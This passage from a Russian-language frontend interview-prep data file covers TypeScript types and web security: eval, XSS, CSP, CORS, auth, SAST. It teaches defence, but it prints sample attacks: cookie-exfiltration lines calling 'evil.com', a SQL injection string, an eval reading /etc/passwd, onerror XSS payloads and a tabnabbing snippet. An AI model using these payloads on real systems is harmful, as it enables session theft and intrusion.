**Required<T>** — все поля обязательны
**Readonly<T>** — все поля только для чтения
**Pick<T, K>** — выбирает поля K из T
**Omit<T, K>** — исключает поля K из T
**Record<K, V>** — объект с ключами K и значениями V
**Exclude<T, U>** — убирает из union T типы из U
**Extract<T, U>** — оставляет в union T только типы из U
**NonNullable<T>** — убирает null и undefined
**ReturnType<T>** — тип возврата функции
**Parameters<T>** — типы параметров функции как tuple
**InstanceType<T>** — тип экземпляра класса
**Awaited<T>** — разворачивает Promise
**ConstructorParameters<T>** — типы параметров конструктора`, score: 4 },
      { name: 'Generics', level: '3', content: `Переиспользуемый код с разными типами:\n\`\`\`ts\nfunction first<T>(arr: T[]): T { return arr[0]; }\n\`\`\`\n\n**Ограничения (extends):**
\`\`\`ts
function getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {
  return obj[key]; // TypeScript знает тип возврата
}
\`\`\`

**Дефолтные типы:**
\`\`\`ts
interface State<T = string> { value: T; }
type State1 = State;         // State<string>
type State2 = State<number>; // State<number>
\`\`\`

**Conditional generics (зависимый возврат):**
\`\`\`ts
type Flatten<T> = T extends Array<infer Item> ? Item : T;
type A = Flatten<string[]>; // string
type B = Flatten<number>;   // number
\`\`\`

**Variance (вариантность):**
- **Covariant (ковариантный):** \`Dog extends Animal\` → \`() => Dog\` совместим с \`() => Animal\` (return types — ковариантны)
- **Contravariant (контравариантный):** \`(Animal) => void\` → несовместим с \`(Dog) => void\` (параметры — контравариантны со \`strictFunctionTypes\`)
\`\`\`ts
type Logger<T> = (value: T) => void;
// Если нужен Logger<Animal>, можно передать Logger<Animal>
// но НЕ Logger<Dog> — т.к. Logger<Animal> ожидает любой Animal
\`\`\``, score: 4 },
      { name: 'Template Literal Types', level: '3', content: `Строковые шаблоны в типах:\n\`\`\`ts\ntype Event = 'click' | 'hover';\ntype Handler = \\\`on\${Capitalize<Event>}\\\`; // 'onClick' | 'onHover'\n\`\`\`\n\nАвтоматическая генерация всех комбинаций из union. 
      **Capitalize\<T\>** — первая буква заглавная: 'hello' → 'Hello'
**Uncapitalize\<T\>** — первая буква строчная: 'Hello' → 'hello'
**Uppercase\<T\>** — всё заглавными: 'hello' → 'HELLO'
**Lowercase\<T\>** — всё строчными: 'HELLO' → 'hello'`, score: 3.5 },
      { name: 'Conditional types, mapped types, infer', level: '4', content: `**Conditional:** T extends string ? 'yes' : 'no'\n**Mapped:** [K in keyof T]?: T[K] — перебор ключей с трансформацией.\n**infer:** вытаскивает тип из структуры:\n\`\`\`ts\ntype ReturnType<T> = T extends (...args: any[]) => infer R ? R : never;\n\`\`\`

**Distributive (разворачивается по union):**
\`\`\`ts
type ToArray<T> = T extends any ? T[] : never;
type A = ToArray<string | number>; // string[] | number[]

// Чтобы ОТКЛЮЧИТЬ distributive — обернуть в кортеж:
type ToArrayStrict<T> = [T] extends [any] ? T[] : never;
type B = ToArrayStrict<string | number>; // (string | number)[]
\`\`\`

**Mapped type modifiers (+/-):**
\`\`\`ts
type Mutable<T> = { -readonly [K in keyof T]: T[K] };   // убрать readonly
type Optional<T> = { [K in keyof T]+?: T[K] };           // добавить ?
type Required<T> = { [K in keyof T]-?: T[K] };           // убрать ?
\`\`\`

**Key Remapping (\`as\`) — переименование ключей в mapped type:**
\`\`\`ts
type NewType<T> = {
  [K in keyof T as НовыйКлюч]: T[K]
}
\`\`\`
После \`as\` можно использовать template literal types для построения нового имени:
\`\`\`ts
// Добавить префикс get к каждому ключу:
type Getters<T> = { [K in keyof T as \`get\${Capitalize<string & K>}\`]: () => T[K] };
type User = { name: string; age: number };
type UserGetters = Getters<User>; // { getName: () => string; getAge: () => number }
\`\`\`
Или conditional type для фильтрации ключей — \`never\` исключает ключ:
\`\`\`ts
// Оставить только строковые ключи:
type StringKeys<T> = { [K in keyof T as T[K] extends string ? K : never]: T[K] };
type User = { name: string; age: number; email: string };
type StringOnly = StringKeys<User>; // { name: string; email: string }
\`\`\`

**infer для сложных структур:**
\`\`\`ts
type Unpacked<T> = T extends Promise<infer U> ? U : T;
type Head<T extends any[]> = T extends [infer H, ...any[]] ? H : never;
type Tail<T extends any[]> = T extends [any, ...infer R] ? R : never;

type H = Head<[string, number, boolean]>; // string
type T = Tail<[string, number, boolean]>; // [number, boolean]
\`\`\``, score: 3 },
      { name: 'Перегрузка функций', level: '4', content: `**Зачем нужна перегрузка:**\nИногда функция ведёт себя по-разному в зависимости от типа аргументов — и возвращаемый тип тоже разный. Без перегрузки TypeScript вывел бы слишком широкий тип и потерял информацию:\n\`\`\`ts\n// Без перегрузки — TS не знает что именно вернётся:\nfunction wrap(value: string | number): string | number[] { ... }\nconst result = wrap('hello'); // тип: string | number[] — неточно\n\n// С перегрузкой — TS знает точно:\nfunction wrap(value: string): string;\nfunction wrap(value: number): number[];\nfunction wrap(value: string | number): string | number[] {\n  return typeof value === 'string' ? value.toUpperCase() : [value];\n}\nconst a = wrap('hello'); // тип: string ✅\nconst b = wrap(42);     // тип: number[] ✅\n\`\`\`\n\n**Структура:**\n\`\`\`ts\n// 1. Сигнатуры перегрузок — только для TypeScript, в JS не существуют:\nfunction format(value: string): string;\nfunction format(value: number, decimals: number): string;\n\n// 2. Сигнатура реализации — невидима снаружи, покрывает все варианты:\nfunction format(value: string | number, decimals?: number): string {\n  if (typeof value === 'string') return value.trim();\n  return value.toFixed(decimals ?? 2);\n}\n\n// Вызвать можно только через сигнатуры перегрузок:\nformat('hello');    // ✅\nformat(3.14, 1);    // ✅\nformat(3.14);       // ❌ — не совпадает ни с одной сигнатурой\n\`\`\`\n\n**Порядок сигнатур важен — конкретные выше:**\n\`\`\`ts\n// ✅ Правильно: более конкретный тип выше\nfunction parse(input: 'json'): object;\nfunction parse(input: string): unknown;\nfunction parse(input: string): object | unknown { ... }\n\n// ❌ Неправильно: string поглощает 'json' раньше\nfunction parse(input: string): unknown;\nfunction parse(input: 'json'): object; // никогда не будет выбрана\n\`\`\`\n\n**Перегрузка методов класса:**\n\`\`\`ts\nclass EventEmitter {\n  on(event: 'data', handler: (data: Buffer) => void): this;\n  on(event: 'error', handler: (err: Error) => void): this;\n  on(event: string, handler: (...args: any[]) => void): this {\n    // реализация\n    return this;\n  }\n}\n\`\`\`\n\n**Когда использовать перегрузку, а когда union:**\n\`\`\`ts\n// Union достаточно — возвращаемый тип не зависит от входного:\nfunction log(value: string | number): void { ... }\n\n// Перегрузка нужна — возвращаемый тип зависит от входного:\nfunction clone(value: string): string;\nfunction clone(value: number): number;\nfunction clone<T>(value: T): T { return value; }\n\`\`\`\n\n**Перегрузка vs generic + conditional — в чём разница:**\n\`\`\`ts\n// Вариант 1 — перегрузка:\nfunction unwrap(value: string[]): string;\nfunction unwrap(value: number[]): number;\nfunction unwrap(value: any[]): any { return value[0]; }\n\nconst a = unwrap(['a', 'b']); // string\nconst b = unwrap([1, 2]);      // number\n\n// Вариант 2 — generic + conditional:\nfunction unwrap2<T extends any[]>(value: T): T extends (infer U)[] ? U : never {\n  return value[0];\n}\n\nconst c = unwrap2(['a', 'b']); // string\nconst d = unwrap2([1, 2]);      // number\n\`\`\`\n\`\`\`\nПерегрузка:\n+ Явный список сигнатур — что не описано, то нельзя вызвать\n+ Хорошо читается в IDE (видишь все варианты вызова)\n- Внутри реализации типы — any/union, нужно if-ить руками\n- Не масштабируется на бесконечное число случаев\n\nGeneric + conditional:\n+ Универсальное правило вывода для любого типа\n+ Внутри реализации тип сохраняется (типобезопаснее)\n- Сложнее читается\n- Ошибки при неподходящем входе менее очевидные\n\`\`\`\n**Когда что выбирать:**\n• 2–5 конкретных случаев с разной семантикой → перегрузка\n• Общее правило для любого типа ("распакуй массив", "достань возвращаемый тип") → generic + conditional`, score: 3 },
      { name: 'Reference types', level: '4', content: `Reference types — директивы в начале файла для подключения типов:\n\n**Triple-slash directives:**\n\`\`\`ts\n/// <reference types="node" />          // подключает @types/node\n/// <reference path="./other.d.ts" />   // подключает конкретный файл\n/// <reference lib="dom" />             // подключает встроенную библиотеку TS\n\`\`\`\n\nВ tsconfig.json можно указать \`types\` или \`lib\` глобально для всего проекта.\n\n**Reference директивы нужны когда:**\n• Нужен тип только в одном файле — не хочешь подключать глобально\n• Автоматически генерируемые .d.ts — компилятор сам добавляет reference чтобы указать зависимости\n• Старые проекты — до того как tsconfig стал стандартом\n\nСейчас в большинстве проектов reference директивы не нужны — всё настраивается через tsconfig.json.`, score: 3.5 },
      { name: 'Использование tsc', level: '4', content: `**tsc** — компилятор TypeScript. Проверяет типы + компилирует в JS.\n\n**tsconfig.json ключевые настройки:**\n• **strict: true** — зонтичный флаг (strictNullChecks, noImplicitAny, и др.)\n• **target** — версия JS на выходе (ES5, ES6, ESNext)\n• **module** — система модулей (commonjs, esnext)\n• **paths** — алиасы импортов\n• **include/exclude** — какие файлы компилировать\n\n**strict: true включает:**\n• **noImplicitAny** — нельзя неявный any\n• **strictNullChecks** — null и undefined не совместимы с другими типами\n• **strictFunctionTypes** — строгая проверка типов функций при присваивании\n• **strictPropertyInitialization** — все поля класса должны быть инициализированы в конструкторе\n\n**--noEmit** — проверяет типы но не генерирует JS файлы. Используется:\n• В CI/CD для проверки типов без сборки\n• Когда сборкой занимается другой инструмент (Vite, webpack) а TS только для типов\n\`\`\`bash\ntsc --noEmit         # только проверка типов\ntsc --watch          # следит за изменениями\ntsc --noEmit --watch # проверка типов в режиме слежения\n\`\`\`\n\n**Ключевые флаги:**\n• **--noEmit** — проверка типов без генерации файлов (для CI, когда сборкой занимается Vite/webpack)\n• **--declaration** — генерирует .d.ts рядом с JS (нужно при публикации библиотеки)\n• **--sourceMap** — генерирует .map файлы: в браузере дебаггер показывает TS-строки вместо скомпилированного JS\n• **--incremental** — кеширует результаты предыдущей компиляции в .tsbuildinfo, повторная сборка только изменённых файлов\n\n**paths + baseUrl — алиасы импортов:**\n\`\`\`json\n// tsconfig.json\n{\n  "compilerOptions": {\n    "baseUrl": ".",\n    "paths": {\n      "@utils/*": ["src/utils/*"],\n      "@components/*": ["src/components/*"]\n    }\n  }\n}\n\`\`\`\n\`\`\`ts\n// Вместо:\nimport { formatDate } from '../../../utils/date';\n// Можно:\nimport { formatDate } from '@utils/date';\n\`\`\`\nВажно: paths — это только TypeScript. Бандлер (Vite, webpack) про них не знает — нужно дублировать алиасы в его конфиге (resolve.alias в Vite, alias в webpack).\n\n**.tsbuildinfo — инкрементальная сборка:**\n\`\`\`json\n// tsconfig.json\n{ "incremental": true, "tsBuildInfoFile": "./.tsbuildinfo" }\n\`\`\`\ntsc при первой компиляции создаёт .tsbuildinfo — snapshot графа зависимостей и хешей файлов. При следующем запуске перекомпилирует только изменившиеся файлы и их зависимости. На больших проектах ускоряет повторную сборку в 3–10 раз.\n\n.tsbuildinfo добавляют в .gitignore — он локальный, зависит от путей машины. В CI сборка с нуля если кеш не восстановлен.`, score: 3.5 },
    ],
  },
  {
    id: 'security',
    title: 'БЕЗОПАСНОСТЬ',
    icon: '🔒',
    color: '#EF5350',
    topics: [
      { name: 'eval, dangerouslySetInnerHTML', level: '2', content: `**eval() — выполняет строку как JS-код в рантайме:**\n\`\`\`js\neval('alert(1)');              // выполнит alert\neval('fetch("evil.com?" + document.cookie)'); // украдёт куки\n\`\`\`\n\n**Почему опасно:**\nЕсли в строку попадают пользовательские данные — атакующий может выполнить любой код с привилегиями текущей страницы: украсть cookies/localStorage, делать запросы от имени пользователя, менять DOM.\n\n**Почему медленно:**\nV8 не может оптимизировать код внутри eval — Hidden Classes, Inline Caching, JIT не работают. Плюс eval читает и модифицирует текущий scope — это блокирует ряд оптимизаций всей окружающей функции.\n\n**Альтернативы:**\n\`\`\`js\n// Вместо eval для вычисления выражений:\nnew Function('x', 'return x * 2')(5); // изолирован от текущего scope\n\n// Вместо eval для динамических ключей:\nconst key = 'name';\nobj[key]; // просто доступ через переменную\n\n// Вместо eval для JSON:\nJSON.parse(str); // безопасно, только данные — не код\n\`\`\`\n\`new Function()\` тоже небезопасен для пользовательского ввода — изолирует от scope, но всё равно выполняет произвольный код.\n\n---\n\n**dangerouslySetInnerHTML — React-аналог innerHTML:**\n\`\`\`jsx\n// ❌ Опасно — если html пришёл от пользователя:\n<div dangerouslySetInnerHTML={{ __html: userContent }} />\n// Если userContent = '<img src=x onerror=alert(1)>' — XSS\n\`\`\`\n\n**Санитизация (sanitize)** — это очистка HTML от опасных тегов и атрибутов перед вставкой в DOM. Санитайзер парсит HTML и удаляет: теги \`<script>\`, обработчики событий (\`onerror\`, \`onclick\`, \`onload\`), \`javascript:\` в href/src, и другие векторы XSS.\n\n**DOMPurify — стандартная библиотека для санитизации:**\n\`\`\`js\nimport DOMPurify from 'dompurify';\n\n// Базовое использование:\nconst clean = DOMPurify.sanitize(dirtyHtml);\n// '<script>alert(1)</script><b>text</b>' → '<b>text</b>'\n// '<img src=x onerror=alert(1)>' → '<img src=x>'\n\n// Разрешить только определённые теги:\nconst clean = DOMPurify.sanitize(html, {\n  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],\n  ALLOWED_ATTR: ['href'],\n});\n\`\`\`\n\n\`\`\`jsx\n// ✅ Правильно — всегда санитизировать перед вставкой:\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />\n\`\`\`\n\n**Когда dangerouslySetInnerHTML вообще нужен:**\n• Вывод rich-text из CMS (контент редактора — Quill, TipTap)\n• Email-превью в браузере\n• Статьи с форматированием из базы\n\nВо всех случаях — только с санитизацией. React специально назвал пропс "dangerously" чтобы разработчик думал дважды.`, score: 3.5 },
      { name: 'Аутентификация и авторизация, их отличия', level: '2', content: `**Аутентификация (Authentication)** — КТО ты? Проверка личности. Логин/пароль, OAuth, биометрия, токен.\n\n**Авторизация (Authorization)** — ЧТО тебе можно? Проверка прав после того как личность установлена. Роли, permissions, scopes.\n\nСначала всегда аутентификация — потом авторизация. Без установленной личности незачем проверять права.\n\n---\n\n**Session-based аутентификация:**\n\`\`\`\n1. Пользователь вводит логин/пароль\n2. Сервер проверяет, создаёт сессию в БД/Redis: { sessionId: 'abc', userId: 42, exp: ... }\n3. Клиент получает httpOnly cookie с sessionId\n4. При каждом запросе браузер автоматически шлёт cookie\n5. Сервер смотрит sessionId → находит сессию → знает кто это\n\`\`\`\nИнвалидация мгновенная — удалил запись в Redis, сессия мертва. Минус: нужен общий Redis при горизонтальном масштабировании.\n\n**JWT-аутентификация:**\n\`\`\`\n1. Пользователь логинится\n2. Сервер создаёт JWT: header.payload.signature\n3. Клиент хранит токен и шлёт в заголовке: Authorization: Bearer <token>\n4. Сервер проверяет подпись — никакой БД не нужно (stateless)\n\`\`\`\n\`\`\`js\n// Payload JWT (читаем кем угодно — не шифруется!):\n{ userId: 42, role: 'admin', exp: 1716000000 }\n\`\`\`\nПлюс: stateless, легко масштабируется. Минус: нельзя мгновенно инвалидировать — токен живёт до истечения exp.\n\n**Где хранить токены:**\n\n**localStorage** — доступен из JS → украдут через XSS. Нельзя для access/refresh токенов.\n\n**httpOnly cookie** — JS не может прочитать, браузер шлёт автоматически. Уязвим к CSRF, но защищается SameSite=Strict/Lax.\n\n**In-memory (переменная в JS)** — самый безопасный для access token. Но теряется при перезагрузке страницы.\n\n**Token rotation паттерн (лучшая практика):**\n\`\`\`\naccess token  → 15 мин, хранить in-memory\nrefresh token → 7 дней, хранить в httpOnly cookie\n\`\`\`\n\`\`\`js\n// access истёк → отправляем refresh token:\nPOST /auth/refresh\nCookie: refresh_token=xyz  // браузер шлёт автоматически\n\n// Сервер:\n// 1. Проверяет refresh token (хэш в БД)\n// 2. Выдаёт новый access token\n// 3. Ротирует refresh token (старый инвалидируется)\nResponse: { accessToken: 'new_jwt' }\n\`\`\`\nРотация refresh при каждом обновлении — если украли refresh, его использование сразу видно (старый уже невалиден).\n\n---\n\n**OAuth 2.0** — протокол делегированной авторизации. Позволяет дать приложению доступ к ресурсам пользователя без передачи пароля.\n\n**Authorization Code + PKCE** — стандартный flow для SPA и мобильных:\n\`\`\`\n1. Редирект на OAuth-провайдер (Google, GitHub)\n2. Пользователь логинится у провайдера → соглашается дать доступ\n3. Провайдер редиректит обратно с code\n4. Клиент меняет code на access token (+ PKCE проверка)\n5. Используем access token для API\n\`\`\`\nPKCE (Proof Key for Code Exchange) — защита от перехвата code: клиент генерирует случайный code_verifier, шлёт его хэш при старте, и сам verifier при обмене.\n\n**Client Credentials** — server-to-server, без пользователя:\n\`\`\`\nPOST /oauth/token\n{ client_id, client_secret, grant_type: 'client_credentials' }\n→ access token\n\`\`\`\nМикросервисы, фоновые задачи, cron-джобы.\n\n**Implicit flow** — устарел, небезопасен. Токен приходил прямо в URL — виден в логах, истории браузера. Заменён на Authorization Code + PKCE.`, score: 4 },
      { name: 'npm audit. SCA и SAST', level: '2', content: `**Почему зависимости — зона риска:**\nТипичное React-приложение тянет 500-1000 пакетов транзитивно. Уязвимость в любом из них — потенциальный вектор атаки. Атаки на supply chain (цепочку поставок) — один из главных векторов последних лет: атакуют не твой код, а пакет который ты используешь.\n\n**npm audit:**\nСравнивает дерево зависимостей с базой CVE (Common Vulnerabilities and Exposures). Показывает уязвимость, severity (low/moderate/high/critical), и через какой пакет она попадает.\n\`\`\`bash\nnpm audit                  # показать все уязвимости\nnpm audit --audit-level=high  # выйти с ошибкой только при high/critical\nnpm audit fix              # обновить уязвимые пакеты (только semver-совместимые)\nnpm audit fix --force      # обновить даже с breaking changes — опасно\n\`\`\`\n\`npm audit fix --force\` может сломать приложение — пакет обновится до мажорной версии с другим API. Делать только осознанно с последующим тестированием.\n\n**SCA (Software Composition Analysis)** — автоматизированный анализ зависимостей на уязвимости и лицензионные проблемы:\n• **npm audit** — встроен в npm, базовый уровень\n• **Snyk** — глубже чем npm audit, находит уязвимости которые audit пропускает, интегрируется в CI\n• **Dependabot (GitHub)** — автоматически создаёт PR для обновления уязвимых пакетов\n\nSCA отвечает на вопрос: *есть ли известные уязвимости в том что я использую?*\n\n**SAST (Static Application Security Testing)** — анализ твоего собственного кода без его запуска. Ищет потенциально опасные паттерны:\n• **ESLint + eslint-plugin-security** — находит eval(), небезопасные регулярки, объекты без hasOwnProperty\n• **SonarQube / SonarCloud** — глубокий анализ: SQL injection, XSS, hardcoded secrets\n• **Semgrep** — кастомные правила под свой стек\n\nSAST отвечает на вопрос: *есть ли уязвимый код в том что я написал?*\n\nSCA + SAST вместе — разные слои защиты: один смотрит на чужой код, другой на твой.\n\n---\n\n**Что именно ищет SAST — типичные паттерны:**\n\n**SQL-инъекция — конкатенация пользовательского ввода в запрос:**\n\`\`\`sql\n-- Запрос на сервере:\nSELECT * FROM users WHERE name = '\$input'\n\n-- Пользователь вводит: ' OR '1'='1\n-- Итоговый запрос:\nSELECT * FROM users WHERE name = '' OR '1'='1'\n-- Возвращает ВСЕХ пользователей\n\`\`\`\nЗащита — параметризованные запросы (prepared statements). Значение передаётся отдельно от SQL-кода — база данных их никогда не смешивает:\n\`\`\`js\n// ❌ Конкатенация — уязвимо:\ndb.query(\`SELECT * FROM users WHERE name = '\${input}'\`);\n\n// ✅ Параметризованный запрос — безопасно:\ndb.query('SELECT * FROM users WHERE name = ?', [input]);\n// или с именованными параметрами (Postgres):\ndb.query('SELECT * FROM users WHERE name = $1', [input]);\n\`\`\`\n\n**Небезопасный eval с пользовательским вводом:**\n\`\`\`js\n// Пользователь передаёт строку:\nconst input = \"require('fs').readFileSync('/etc/passwd')\";\neval(input); // выполнит — прочитает системные файлы\n\`\`\`\nSAST видит \`eval(\` + переменная = потенциальная уязвимость. Никогда не передавать пользовательский ввод в eval.\n\n**Захардкоженные секреты:**\n\`\`\`js\n// ❌ Плохо — секреты в коде:\nconst API_KEY = 'sk-1234567890abcdef'; // попадёт в git историю\nconst DB_PASSWORD = 'super_secret';\n\n// ✅ Хорошо — через переменные окружения:\nconst API_KEY = process.env.API_KEY;\nconst DB_PASSWORD = process.env.DB_PASSWORD;\n\`\`\`\nSAST ищет паттерны \`password =\`, \`api_key =\`, \`secret =\`, токены в виде строк. Инструменты: truffleHog, git-secrets, GitHub secret scanning (встроен, сканирует автоматически при пуше).\n\n**Если секрет уже попал в git — удаление из кода не помогает.** Git история хранит всё. Нужно: немедленно инвалидировать секрет (отозвать ключ/пересоздать пароль), и опционально почистить историю через \`git filter-repo\`.`, score: 3 },
      { name: 'Атрибут rel: noreferrer, noopener, nofollow', level: '3', content: `**Проблема без этих атрибутов:**\nПри открытии ссылки в новой вкладке (\`target="_blank"\`) новая страница получает доступ к \`window.opener\` — ссылке на вкладку которая её открыла. Атакующий может написать:\n\`\`\`js\n// На evil.com, куда вела ссылка с вашего сайта:\nwindow.opener.location = 'https://fake-login.com';\n// Пользователь смотрит на новую вкладку, а оригинальный сайт\n// незаметно заменился на фишинговую копию — это tabnabbing\n\`\`\`\n\n**noopener** — блокирует доступ к \`window.opener\`. Новая вкладка открывается в отдельном процессе без связи с оригинальной:\n\`\`\`html\n<a href="https://external.com" target="_blank" rel="noopener">\n\`\`\`\n\n**noreferrer** — делает то же что noopener, плюс не передаёт заголовок \`Referer\`. Referer — это URL страницы, с которой пришёл пользователь. Без него внешний сайт не узнает откуда пришёл переход:\n\`\`\`\n// Без noreferrer внешний сайт видит:\nReferer: https://yoursite.com/secret-page\n\n// С noreferrer — заголовок отсутствует\n\`\`\`\nНорма: всегда писать \`rel="noopener noreferrer"\` вместе для target="_blank".\n\n**nofollow** — не про безопасность, а про SEO. Указание поисковым роботам не передавать «ссылочный вес» (PageRank) на эту страницу:\n\`\`\`html\n<!-- Пользовательский контент, платные ссылки, недоверенные источники: -->\n<a href="https://sponsor.com" rel="nofollow">Реклама</a>\n\`\`\`\nГугл требует nofollow для платных/рекламных ссылок — иначе это манипуляция поисковой выдачей.`, score: 3 },
      { name: 'CSP и X-Frame-Options', level: '3', content: `**CSP (Content Security Policy)** — HTTP-заголовок, который говорит браузеру откуда разрешено загружать ресурсы. Второй рубеж защиты от XSS: даже если атакующий внедрил скрипт — браузер его не выполнит, если домен не в белом списке. Первый рубеж — экранирование на сервере, CSP — страховка при его пробое.

**Директивы** — каждая отвечает за свой тип ресурса. \`default-src\` — фолбэк для всех директив которые не заданы явно:
\`\`\`
Content-Security-Policy:
  default-src 'self';                   // только свой домен — фолбэк для остальных
  script-src 'self' cdn.example.com;   // откуда грузить JS
  style-src  'self' 'unsafe-inline';   // откуда грузить CSS
  img-src    'self' data: https:;      // картинки — свой + data URI + любой HTTPS
  connect-src 'self' api.example.com;  // fetch / XHR / WebSocket
  font-src   'self' fonts.gstatic.com; // шрифты
  frame-src  'none';                   // запрет загружать iframe на странице
  frame-ancestors 'none';              // запрет встраивать эту страницу в чужой iframe
  object-src 'none';                   // запрет Flash и плагинов
  upgrade-insecure-requests;           // автоматом заменяет http:// на https://
\`\`\`

**Ключевые значения:**
\`\`\`
'self'          — только текущий домен (без поддоменов)
'none'          — запрещено полностью
'unsafe-inline' — разрешить inline-стили/скрипты (ослабляет защиту)
'unsafe-eval'   — разрешить eval(), Function() (крайне нежелательно)
https:          — любой HTTPS домен
data:           — data: URI
\`\`\`

**Inline-скрипты запрещены по умолчанию** — это главная защита от XSS. Если атакующий внедрил \`<script>alert(1)</script>\` — браузер его заблокирует, потому что скрипт inline, а не с разрешённого домена.

\`'unsafe-inline'\` разрешает все inline-скрипты — сразу снимает эту защиту, использовать не стоит.

Правильное решение когда нужны inline-скрипты — **nonce**:
\`\`\`
// Сервер при каждом запросе генерирует новый случайный токен:
Content-Security-Policy: script-src 'nonce-СЛУЧАЙНЫЙ_ТОКЕН'

// И ставит его атрибутом на легитимные inline-скрипты:
<script nonce="СЛУЧАЙНЫЙ_ТОКЕН">/* легитимный код */</script>
\`\`\`
Атакующий не знает токен текущего запроса — его инжектированный скрипт без нужного nonce будет заблокирован.

Альтернатива — **hash**: браузер сам считает sha256 от содержимого скрипта и сравнивает:
\`\`\`
Content-Security-Policy: script-src 'sha256-47DEQpj8HBSa+/TImW+5JCeuQeR='
\`\`\`
Подходит для статичных inline-скриптов которые не меняются — не требует серверной генерации токена.

**Report-Only** — CSP в режиме наблюдения: нарушения не блокируются, а отправляются на указанный URL. Используют чтобы протестировать политику перед включением:
\`\`\`
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
\`\`\`

**Отладка:** при нарушении CSP браузер выводит в Console точную ошибку — какой ресурс заблокирован и какой директивой. Там же видно что нужно добавить в политику.

**X-Frame-Options** — запрещает встраивать страницу в \`<iframe>\`. Защита от **clickjacking**: атакующий кладёт твой сайт в прозрачный iframe поверх своей страницы — жертва думает что кликает по чужой кнопке, а на самом деле жмёт "Подтвердить перевод" на твоём сайте.
\`\`\`
X-Frame-Options: DENY        — нельзя встроить нигде
X-Frame-Options: SAMEORIGIN  — только на своём домене
\`\`\`

**Современная альтернатива — \`frame-ancestors\` в CSP**, поддерживает несколько доменов и более гибкая:
\`\`\`
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self' https://partner.com;
\`\`\`
Если заданы оба — \`frame-ancestors\` в CSP имеет приоритет в современных браузерах. X-Frame-Options оставляют для совместимости со старыми.`, score: 3.5 },
      { name: 'CORS', level: '3', content: `**Зачем вообще существует Same-Origin Policy:**\nБраузер по умолчанию запрещает JS на одном домене читать ответы с другого. Без этого любой сайт мог бы в фоне делать запросы от твоего имени — читать почту, банковский счёт, отправлять формы. CORS — механизм, позволяющий серверу явно разрешить доступ с конкретных доменов.\n\n**Origin = протокол + домен + порт.** Разные origin:\n\`\`\`\nhttps://site.com  vs  http://site.com    // разный протокол\nhttps://site.com  vs  https://api.com    // разный домен\nhttps://site.com  vs  https://site.com:8080  // разный порт\n\`\`\`\n\n**Простые запросы** (GET, POST с обычными заголовками) — браузер шлёт запрос с заголовком Origin, сервер отвечает с Access-Control-Allow-Origin. Если домен не совпадает — браузер блокирует чтение ответа (запрос дошёл до сервера, браузер просто не даёт JS прочитать результат).\n\n**Preflight (предварительный запрос)** — для "сложных" запросов (PUT, DELETE, PATCH, кастомные заголовки типа Authorization): браузер сначала шлёт OPTIONS, спрашивая разрешение, и только при положительном ответе шлёт настоящий запрос:\n\`\`\`\n// Браузер автоматически:\nOPTIONS /api/users\nOrigin: https://frontend.com\nAccess-Control-Request-Method: DELETE\nAccess-Control-Request-Headers: Authorization\n\n// Сервер должен ответить:\nAccess-Control-Allow-Origin: https://frontend.com\nAccess-Control-Allow-Methods: GET, POST, DELETE\nAccess-Control-Allow-Headers: Authorization\nAccess-Control-Max-Age: 86400  // кэшировать preflight на сутки\n\`\`\`\n\n**CORS с credentials — куки и Authorization через домены:**\nПо умолчанию браузер не отправляет куки на другой домен даже если CORS разрешён. Нужно явно включить с обеих сторон:\n\`\`\`js\n// Клиент — явно указать credentials:\nfetch('https://api.site.com/data', {\n  credentials: 'include', // отправлять куки!\n});\n\n// Или axios:\naxios.get('https://api.site.com/data', {\n  withCredentials: true,\n});\n\`\`\`\n\`\`\`\n// Сервер ОБЯЗАН ответить двумя заголовками:\nAccess-Control-Allow-Origin: https://mysite.com  // НЕ может быть *!\nAccess-Control-Allow-Credentials: true\n\`\`\`\n\`Access-Control-Allow-Origin: *\` + \`credentials: include\` — браузер заблокирует запрос. Это намеренное ограничение.\n\n**Почему * нельзя с credentials — связь с CSRF:**\nЕсли бы \`*\` работал с credentials, любой сайт мог бы делать запросы от имени пользователя с его куками. Это открыло бы дверь для CSRF-атак в обход SameSite-защиты. Требование конкретного домена означает что сервер осознанно доверяет именно этому источнику.\n\n**CORS — это защита браузера, не сервера.** Curl или Postman не соблюдают CORS — они просто шлют запросы. CORS защищает от атак через браузер пользователя, не от прямых запросов к API.`, score: 3.5 },
      { name: 'XSS', level: '3', content: `**XSS (Cross-Site Scripting)** — атака при которой вредоносный JS выполняется в браузере жертвы в контексте доверенного сайта. Атакующий получает те же права что и сам сайт: читает куки, localStorage, делает запросы от имени пользователя, меняет DOM.\n\n**Stored XSS (хранимый)** — скрипт сохраняется в БД и показывается всем пользователям:\n\`\`\`\nАтакующий пишет комментарий: <script>fetch('evil.com?c='+document.cookie)</script>\nСервер сохраняет это в БД.\nДругой пользователь открывает страницу → браузер выполняет скрипт → куки улетают.\n\`\`\`\nСамый опасный тип — автоматически поражает всех посетителей.\n\n**Reflected XSS (отражённый)** — скрипт передаётся в URL и сервер отражает его обратно в HTML:\n\`\`\`\nhttps://site.com/search?q=<script>alert(1)</script>\nСервер: <h1>Результаты для: <script>alert(1)</script></h1>\n\`\`\`\nЖертву нужно заставить перейти по специально сформированной ссылке (фишинг, спам).\n\n**DOM-based XSS** — сервер не при делах, уязвимость в клиентском JS:\n\`\`\`js\n// Берём значение из URL и суём в DOM без проверки:\nconst name = location.hash.slice(1);\ndocument.getElementById('greeting').innerHTML = 'Привет, ' + name;\n// URL: https://site.com/page#<img src=x onerror=alert(1)>\n\`\`\`\nОпасные источники: \`location.hash\`, \`location.search\`, \`document.referrer\`.\nОпасные получатели: \`innerHTML\`, \`outerHTML\`, \`document.write\`, \`eval\`.\n\n**Как React защищает по умолчанию:**\nJSX экранирует всё что выводится через \`{}\`. \`<\` превращается в \`&lt;\`, \`>\` в \`&gt;\` и т.д. — строка рендерится как текст, не как HTML:\n\`\`\`jsx\nconst userInput = '<script>alert(1)</script>';\n<div>{userInput}</div>\n// В DOM: <div>&lt;script&gt;alert(1)&lt;/script&gt;</div> — безопасно\n\`\`\`\n\n**Где React НЕ защищает:**\n\`\`\`jsx\n// dangerouslySetInnerHTML — вставляет HTML как есть:\n<div dangerouslySetInnerHTML={{ __html: userInput }} /> // ❌\n\n// href с javascript: — выполнится при клике:\n<a href={userUrl}>link</a> // если userUrl = 'javascript:alert(1)' — ❌\n// Защита: проверять что href начинается с https://, не с 